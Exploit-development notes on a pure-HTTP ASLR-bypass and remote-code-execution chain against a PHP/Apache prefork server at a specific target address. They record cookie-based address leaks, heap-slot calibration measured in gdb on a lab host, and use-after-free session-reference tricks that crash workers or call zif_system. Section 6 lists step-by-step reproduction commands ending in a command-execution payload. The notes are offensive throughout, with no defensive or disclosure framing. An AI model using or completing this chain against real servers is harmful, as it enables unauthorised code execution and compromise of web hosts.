# Pure HTTP ASLR Chain: Rotation Problem Research Notes

Date: 2026-10-21
Reference deliverable: [ASLR_PURE_HTTP.md](ASLR_PURE_HTTP.md) (a previous author already
ran 5/5, rotating workers between stages via SIGSEGV)
Constraint: attack requests use HTTP only; **no instrumentation on target 172.16.0.103**
(no gdb, no /proc reads, no target-side PHP). All gdb measurements in this document were
performed on **our own calibration lab 172.16.1.112**, never touching the target process.

Status: **the address leaks and the RCE terminal themselves are already pure HTTP; the only
remaining engineering item is "how to rotate the worker between stages with a single HTTP
request"**. That one is not solved yet; this document records the blockers and next steps.

---

## 1. Verified (all on 172.16.0.103, HTTP only)

### 1.1 Stage 2 leak on a brand-new master

```text
$ sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start
$ python3 send_a_leak3.py 1001 5 39 12 17
$ python3 b_target.py 443 16 983

Set-Cookie: PHPSESSID=%10%00%00%00%00%00%00%00P%3C%E1%01%A6%7F%00%00; path=/
pDestructor = 0x7fa601e13c50
libphp      = 0x7fa601800000   (pDestructor - 0x613c50)
```

`(p & 0x1fffff) == 0x13c50`, libphp 2MB-aligned, the leak is valid.

### 1.2 Stage 1 + stage 2 can run on the **same worker**

```text
W0=882266
after A1 W=882266
after B1 W=882266
after A2 W=882266
after B2 W=882266
```

That is:

1. `send_a_leak2.py 1001 12` + `b_numleak2.py 892 1 0x1000` → chunk base;
2. on the same worker, `send_a_leak3.py 1001 5 39 12 17` + `b_target.py 443 16 983`
   → libphp base (still returns the 16-byte `pDestructor`).

This shows that the claim "every stage must switch to a fresh worker" does not hold;
**both leaks can be merged into one worker's history**, and rotating once before
stage 3 suffices.

### 1.3 The HTTP crash rotation works on **fresh workers**

```text
FRESH W=881054
after A W=881054
CRASHED new=881148 at 17
final W=881148
```

This is exactly the `rotate()` in the script:

```text
send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
send_b_rce2.py 15 2 0x1 0x1 x
```

`send_b_rce2`'s fake reference lands at the fresh worker's `R0-0x10` with
`val.value=1`; `zend_array_destroy(1)` → SIGSEGV, and prefork immediately forks a
new worker.

---

## 2. Failure Point: The HTTP Rotate Fails on a Worker That **Has Served Leak Requests**

### 2.1 The official driver with signals removed, HTTP rotate only

On .103, changing the sudo calls in `pure_aslr_run.sh` to `sudo -n` and nothing else:

```text
W1=877061 chunk=0x7f6beba00000 attempt=1
W2=877299 libphp=0x0 attempt=1
W2=877349 libphp=0x0 attempt=2
LIBPHP_LEAK_FAILED
```

Stage 1 succeeded; after the HTTP rotate, stage 2 failed to obtain the libphp leak
twice in a row (`b_target.py` did not return the 16-byte `Set-Cookie`).

### 2.2 Direct observation of the rotate

After stage 1, running `send_a_pad + send_b_rce2(HT=1)` six times in a row, the worker
pid **never changed once**:

```text
PHASE1 W=879429
no-rotate try=1 W=879429
...
no-rotate try=6 W=879429
STAGE2 W=879429
SETCOOKIE_LEN 72
VALUE Set-Cookie: PHPSESSID=%10...P%3CaP%EA%7F...
```

In this run stage 2 actually succeeded on the same worker, which shows:

- the rotate's crash request does not fire on a used history;
- stage 2 does not depend on a fresh worker (consistent with 1.2).

---

## 3. Root Cause (gdb measurements on the .112 calibration lab)

> All addresses below are chunk-relative values from the no-ASLR lab; the target has
> ASLR but the within-chunk geometry is the same. The measurements never involve
> 172.16.0.103.

### 3.1 Geometry of a fresh stage 3

- A `send_a_pad 17 19 3 12 6×7:7`:
  `PS(http_session_vars).value.ref = chunk + 0x24e0`.
- `R0 - 0x10 = chunk + 0x24d0`, which is exactly the free block start of the 56B bin.
- B `send_b_zif 15 2 ...`'s 55B fake-ref raw lands exactly there;
  the fake reference's fields are at raw+0x10, aligned with `R0`.

### 3.2 The geometry of a used history is completely different

Running stage 1 + stage 2 on the same worker first, then sending stage 3's A:

| pads P | R0 | R0's page | That page's map at B's `track_init` |
|---|---|---|---|
| 6 | chunk+0x1560 | page 1 | `0x80000003` = 32B bin |
| 7 | chunk+0x15c0 | page 1 | `0x80000003` = 32B bin |
| 45 | chunk+0x7d400 | page 125 | `0xc0030018` = NRUN/large chunk continuation page |
| 640 | chunk+0x8b320 | page 139 | `0x0` = FRUN free page |

Whereas fresh's `R0=chunk+0x24e0` sits on a 56B bin page (the 56B free head is
`chunk+0x24d0`).

Conclusions:

1. **Under a used history, `R0` lands on a 32B bin page**, not a 56B page;
2. `send_b_zif`'s fake-ref raw is 55B → 56B bin, and **cannot be allocated into a
   32B page**;
3. even if P moves `R0` to a page-aligned 56B slot (e.g. P=7's
   `R0-0x10=chunk+0x15b0`), that page is still a 32B bin at B
   (`map=0x80000003`), so the 56B raw still cannot get in;
4. with P=640, `R0`'s page is even FRUN (a fully free page), and the 56B bin's current
   head remains `chunk+0x24d0`; the allocator will not grab that high free page for a
   handful of 56B allocations.

### 3.3 Under a used history, B may never reach track_init at all

Break at `session.c:481` (the `php_session_track_init()` call site) on a new worker
(fresh): A+B hits it and the reference is visible. On a used history (after stage 1+2,
A with P=6), setting the same breakpoint and sending B (`b_crash7.py 14`) — **it never
hits once**; `php_session_rfc1867_cleanup` / `php_session_initialize` do not hit either.

This means under a used history there are two possibilities (depending on P/timing):

- A aborts by itself during request shutdown, and B is handled by a new worker forked
  by the parent; the new worker has no dangling reference, so `track_init` never
  destroys the old one;
- or B's END cleanup returns early inside `php_session_initialize()` and never
  reaches `track_init`.

Either way, **the fake reference trigger of a fresh stage 3 does not hold on a used
history**. That is also why the same-worker scan with P=50..75 was all `nop`.

---

## 4. What the Pure HTTP Path Needs

To fill in the last piece **without touching the target**, there are only two roads:

### 4.1 A reliable HTTP worker rotation (recommended)

Split "leak" and "exploit" across two fresh workers:

```text
W1 (fresh): stage 1 + stage 2 leaks (verified to work on one worker)
HTTP crash W1 -> W2 (fresh; prefork inherits the same master's ASLR)
W2 (fresh): stage 3 exploit (existing fresh parameters, verified)
```

What is missing is only "W1 is used — how to crash it via HTTP". The existing
`rotate()`'s `send_a_pad + send_b_rce2(HT=1)` only works on fresh workers.

Pure HTTP crash primitives to try:

1. **`b_crash7` (a 32B live string)**
   - Use N 7-byte values (32B zend_strings) to overwrite the used `R0`;
   - `R0` is a 32B slot, which exactly matches the 32B value string;
   - `PS(http_session_vars)` is still treated as a reference: `h=0` reads as
     `val.value`, `len=7` reads as `IS_ARRAY` → `zend_array_destroy(NULL)`
     crashes, **requiring no 56B page re-chunking and unaffected by the free-list
     shadow**.
   - Blocker: B must genuinely reach `track_init`, and the old reference must still be
     present (on a used history it is sometimes UNDEF, or B is handled by a new
     worker). N needs calibration against the used history, and first confirm A
     does not crash.
2. **Make A abort deterministically in shutdown by itself**
   - A sometimes aborts on a used history (P=50/68 giving `W3=0`), but it is not
     controllable;
   - an A shape is needed such that `PS(http_session_vars)`'s stale 32B block
     necessarily triggers `zend_mm_panic` after the heap reset, while A's response
     has already been sent.
3. **Look for a deterministic crash in malformed multipart / the Apache layer**
   - Independent of PHP heap layout, pure HTTP; not found yet.

### 4.2 No rotation; calibrate the used-history stage 3 directly

This requires solving all of the following at once:

1. `R0`'s page must be a 56B bin (or switch to a fake-ref layout matching 32B);
2. the 56B fake raw must land on the specific free slot `R0-0x10`;
3. A must not crash and B must reach `track_init`;
4. `send_b_zif`'s fake HT carrier address (fresh: `chunk+0x6e0d8`) must also be
   re-calibrated for the used history.

Currently 1/3 already has counterexamples (the page is 32B, B does not hit), so this
road costs more.

---

## 5. Suggested Next Experiments

Do 4.1.1 (crash7) first, since it only needs **32B geometry**, which naturally matches
the used `R0`:

1. On .112, fix a used history (stage 1+2 on the same worker), use P=6 for A, and
   use the `session.c:481` breakpoint to confirm whether `PS(http_session_vars)` is
   still a reference after A (and the id/send_cookie state);
2. If the reference exists after A, scan `b_crash7.py N`'s N, watching the qword at
   `R0` via a breakpoint:
   - `q0 = 0x0000000600000001` (live string, rc=1/type=6)
   - `q2 = 7` (len=7)
   - `q3 = 0x0076767676767676` ('v'*7)
   means it hit;
3. Once it hits, send `b_crash7.py N` directly (without gdb) and confirm the worker
   pid changes;
4. On .103, HTTP only:
   - fresh W1: stage 1 + stage 2 leaks;
   - rotate with `send_a_pad P=6 + b_crash7 N`;
   - fresh W2: stage 3 `send_a_pad 6 pads + send_b_zif 15 2 HTDATA ZIF`,
     with addresses from W1 (prefork inherits the same master's ASLR, and the
     chunk/libphp bases stay unchanged after re-fork; see section 5 of
     ASLR_PURE_HTTP.md).
5. If crash7's old reference does not exist on the used history, fall back to:
   making stage 2's B abort by itself after leaking (by changing `b_target`'s target
   array layout so that `zend_string_release_ex(PS(id))`'s gc/refcount drives `efree`
   to an invalid internal pointer); then W1 rotates naturally after stage 2, and W2
   runs a fresh stage 3 directly.

---

## 6. Reproduction Commands (.103, pure HTTP; no gdb/maps)

```bash
# 1) fresh master
sudo -n apache2ctl -k stop; sudo -n apache2ctl -k start; sleep 0.5

# 2) W1: chunk leak + libphp leak on the same worker
python3 send_a_leak2.py 1001 12; sleep 0.2
python3 b_numleak2.py 892 1 0x1000; sleep 0.2
python3 send_a_leak3.py 1001 5 39 12 17; sleep 0.2
python3 b_target.py 443 16 983
# parse /tmp/b_numleak2.resp -> chunk, /tmp/b_target.resp -> pDestructor

# 3) pure HTTP rotation (N still to be calibrated)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 b_crash7.py <N>

# 4) W2: fresh stage 3
HT=$(chunk+0x6e0d8); ZIF=$(libphp+0x43a870)
python3 send_a_pad.py 17 19 3 12 7:7 7:7 7:7 7:7 7:7 7:7
python3 send_b_zif.py 15 2 $HT $ZIF 'id>/tmp/p1'
```

---

## 7. Files

| File | Purpose |
|---|---|
| `tools/b_crash7.py` | 32B live-string crash primitive (N to be calibrated) |
| `tools/refq2.gdb` / `flow.gdb` | On .112, to watch the used-history reference/track_init flow |
| `tools/pagemap.gdb` | On .112, to read R0's page's `chunk->map` / free_slot |
| `tools/send_b_probe.py` / `b_probe_long.py` | Fake-ref landing probes |
| `tools/same_worker_trials.py` | Same-worker stage 3 P scan (.112) |
| `tools/pure_aslr_run.sh` | The previous author's driver (has HTTP rotate, unreliable on used workers) |

---

## 8. Conclusion

- **The attack requests, both address leaks, and the `zif_system` terminal are
  already pure HTTP**;
- the recorded 5/5 runs used SIGSEGV for between-stage rotation; the script's HTTP
  `rotate()` is only reliable on fresh workers and does not fire on workers that have
  served leaks;
- the used-history root cause is that `R0` lands on a 32B bin page, while a fresh
  stage 3's fake-ref raw is a 56B bin; the page is not re-chunked, so the landing
  geometry does not hold;
- the shortest path to close the gap is: **stage 1+2 on one worker → make a pure HTTP
  crash with `b_crash7` (32B) → fresh W2 runs the existing stage 3**. crash7's N needs
  calibration against the used history, and first confirm that the old reference is
  still present after A.
